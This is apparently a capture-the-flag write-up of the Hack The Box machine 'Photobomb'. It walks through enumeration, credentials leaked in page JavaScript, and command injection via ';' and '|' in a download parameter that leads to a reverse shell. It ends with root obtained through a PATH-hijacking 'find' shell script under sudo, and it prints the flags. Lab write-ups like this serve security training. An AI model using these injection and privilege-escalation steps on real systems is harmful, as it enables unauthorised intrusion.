# Photobomb
<div align="center">
  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/8775d37c-91c2-43fb-bddd-36da3cca479d"></img>
</div>

Welecome back, today  we will see an hackthebox machine called Photobomb
Let’s start out with a usual nmap scan.

```diff
# Nmap 7.92 scan initiated Fri Oct 21 09:54:09 2022 as: nmap -sC -sV -oN phtbomb_nmap.txt 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 21 09:54:18 2022 -- 1 IP address (1 host up) scanned in 9.20 seconds
```

As always there’s the web page that we can visit.

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/ebbfb934-a583-431c-8a03-7a1f2801fdff"></img>

Nothing cool here unless a link which needs credentials to login.

By the way we can try to use gobuster

```cpp
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Photobomb]
└─$ gobuster dir --wordlist=/usr/share/wordlists/dirb/big.txt -u http://photobomb.htb/ 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://photobomb.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/21 09:56:38 Starting gobuster in directory enumeration mode
===============================================================
/[                    (Status: 400) [Size: 273]
/]                    (Status: 400) [Size: 273]
/favicon.ico          (Status: 200) [Size: 10990]
/plain]               (Status: 400) [Size: 278]  
/printer              (Status: 401) [Size: 188]  
/printer-friendly     (Status: 401) [Size: 188]  
/printer_friendly     (Status: 401) [Size: 188]  
/printerfriendly      (Status: 401) [Size: 188]  
/printers             (Status: 401) [Size: 188]  
/quote]               (Status: 400) [Size: 278]  
                                                 
===============================================================
2022/10/21 09:58:27 Finished
==============================================================
```

There are a few folders which are useless because they need  a password to visit them, but if we look at the source code we can spot an unusual link

```jsx
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

By following the given path it set for us the credentials that will be necessary to login into the printer page.

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/6869064b-a1aa-4ab9-8f20-28b108ef1487"></img>

At the moment we can’t find anything, but if throw an error by trying to find something that doesn’t exist into the url we get this message

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/1bffd86a-4dec-4576-b8bb-edcf76f7b7b7"></img>

This is the error message for the Sinatra Web-Framework which is vulnerable to directory trasversal, as we an see from this post [snyk](https://security.snyk.io/vuln/SNYK-RUBY-SINATRA-22017)

Even if we follow the idea of the Exploit it won't work but we still have the image downloader. So let’s take the request with burpsuite and try to inject some args

With the first we can’t do anything while with the second we are able to add others extensions to the file and get strange results

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/29d23de5-6e1d-4606-97aa-546cccce57ff"></img>

And here is the result

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/bcaddcdb-d85a-441b-89b1-2ef4cdddba9f"></img>

As you can see we are able to specify the output of how the image which gets printed 

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/054c0f62-f92d-4680-a6aa-9c84b5268a88"></img>

Now while fuzzing we find that there are two useful characters which are the `;` and the `|` that are the character to run more commands in a shell.

Here is an example.

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/b83f82f4-5200-4770-b73c-22a0d91cc8ab"></img>

So now we have to manage a way to get a reverse shell.

Because we are able to run bash commands we can make it tale our php rev-shell from us

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/b24d037a-3197-48d3-811a-7331731fdcf4"></img>

Now the only problem is that we have to find where our shell is. By injecting as command `python3 -m http.server` we can see that we are here

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/c7dd0f9d-64bd-4399-9866-c9d222686a10"></img>

So as you can see we have found the rev-shell but if we simply call it trough the URL we are no able to run it, this probably means that php is not installed, so thi was definetly a rabbit hole.

By the way before i forgot to try running a rev-shell with python, which turned out to be the solution.

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/1824ea49-21cd-4a49-800e-c0b3e99461c52"></img>

And here's why we couldn’t execute our rev-shell

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/d5b1ae4f-8d80-41d2-a3c1-484c1f3b4f3d"></img>

The php command was not installed.

By the way, we got the shell and now we can grab the user flag.

```python
wizard@photobomb:~$ cat user.txt
589b2daea8041e50dfd59a92c86783e7
wizard@photobomb:~$
```

# Root.txt

Here we are at the funniest part where we have to become root.
As always the first thing i do is checking for some privileges with `sudo -l`

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/43ab949a-444d-45c2-87b5-71a301f26621"></img>

Here is an interesting one because we can run a file called `/opt/cleanup.sh` as root

```bash
wizard@photobomb:/opt$ cat cleanup.sh 
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

If we look closely we can spot a command which gets runned without specifying its full PATH or `find`, so we just need to create an executable called `find` into the tmp folder that call a bash, adn then change the PATH with tmp as first folder.

Like this when the code will be ran as root it will execute not the real find but our find which is a shell spawner.

```bash
wizard@photobomb:/tmp$ cat find
#!/usr/bin/python3
import os
import sys 

try:
    os.system("/bin/sh")
except:
    os.exit()
```

Know we have to change the PATH

```bash
wizard@photobomb:/tmp$ export PATH=/tmp:$PATH
```

Like this when we run `find` we get a shell

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/190f966f-eb82-4011-ad38-aa676fe25722"></img>

Now we need to run it trough the file as sudo

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/30240213-f9cc-41c7-b72e-10e609c8b455"></img>

Mhhmm... It doesn't work, because it even export the curren PATH, but the sudo says that we can not only run as root the program but even set the env variables run-time, so just pipe all togheter

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/794ebfd2-0953-43d9-b75e-f6fe5fb19613"></img>

And.... It worked so now we can fetch the root flag!

```bash
root@photobomb:~# cat root.txt 
60a8c867e31611a23dc277dcec2de33c
root@photobomb:~#
```

We did it!
<div align="center">
  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/3ce0a554-60dc-4475-8498-c9985b800e7f"></img>
</div>

Thanks for the attention 0xCY@
